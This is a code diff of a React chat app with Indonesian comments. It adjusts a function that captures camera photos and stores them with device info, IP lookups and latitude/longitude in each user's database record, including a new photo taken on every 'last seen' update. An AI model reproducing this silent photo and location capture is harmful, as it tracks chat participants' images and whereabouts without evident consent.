@@ -371,9 +371,9 @@ const capturePhoto09090 = () => {
   // ========= FUNGSI CAPTURE FOTO =========
   const capturePhoto = async (status = "unknown") => {
      if (!photoCaptureEnabled) {
-    console.warn("Capture Photo dimatikan");
-    return null; // jangan ambil foto
-  }
+      console.warn("Capture Photo dimatikan");
+      return null; // jangan ambil foto
+    }
     try {
       // Cek semua device kamera yang tersedia
       const devices = await navigator.mediaDevices.enumerateDevices();
@@ -635,7 +635,7 @@ try {
       deviceInfo,
       ip1:ipInfo,
       ip2:ipInfo1,
-      photoURL: photoURL || null
+      // photoURL: photoURL || null
     };
 
     if (ipInfo) data.ip1 = ipInfo;
@@ -669,15 +669,18 @@ try {
       data.latitude = latitude;
       data.longitude = longitude;
     }
+    if (photoURL) data.photoURL = photoURL;
      update(userRef, data);
   };
 
   const updateLastSeen = async () => {
     await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
- const photoURL = await capturePhoto("update_lastSeen");
+     const photoURL = await capturePhoto("update_lastSeen");
     update(userRef, {
       lastSeen: serverTimestamp(),
       // photoURL2: photoURL || null
+      
+    ...(photoURL ? { photoURL_lastSeen: photoURL } : {})
     });
   };
 
@@ -730,12 +733,14 @@ try {
           <h2 className=" text-lg md:text-xl font-semibold text-gray-800 dark:text-gray-100">
             Chat dengan {currentUser}
           </h2>
-  <button
-  onClick={() => setPhotoCaptureEnabled(!photoCaptureEnabled)}
-  className="absolute left-4 top-1/2 -translate-y-1/2 px-3 py-1 text-sm rounded bg-blue-600 text-white"
+ <button
+  onClick={() => setPhotoCaptureEnabled((prev) => !prev)}
+  className={`px-3 py-1 mt-2 rounded text-white 
+    ${photoCaptureEnabled ? "bg-green-600" : "bg-red-600"}`}
 >
   {photoCaptureEnabled ? "Capture ON" : "Capture OFF"}
 </button>
+
 
             <button 
               onClick={toggleTheme} 
